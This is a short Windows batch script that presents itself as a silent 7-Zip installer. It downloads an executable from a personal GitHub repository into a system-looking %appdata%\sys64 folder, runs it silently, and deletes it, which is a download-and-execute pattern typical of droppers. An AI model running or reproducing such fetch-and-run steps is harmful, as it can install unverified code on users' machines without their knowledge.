@echo off

:: Set the path for the new directory and the 7zip installer
set "folderPath=%appdata%\sys64"
set "installerPath=%folderPath%\7z2406-x64.exe"
set "url=https://github.com/nizhenets/test/raw/main/7z2406-x64.exe"

:: Create the directory if it doesn't exist
if not exist "%folderPath%" mkdir "%folderPath%"

:: Download 7zip installer
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%installerPath%')"

:: Install 7zip silently
start /wait "" "%installerPath%" /S

:: Clean up the installer
del "%installerPath%"

:: Notify completion
echo 7zip has been installed silently in %folderPath%.

pause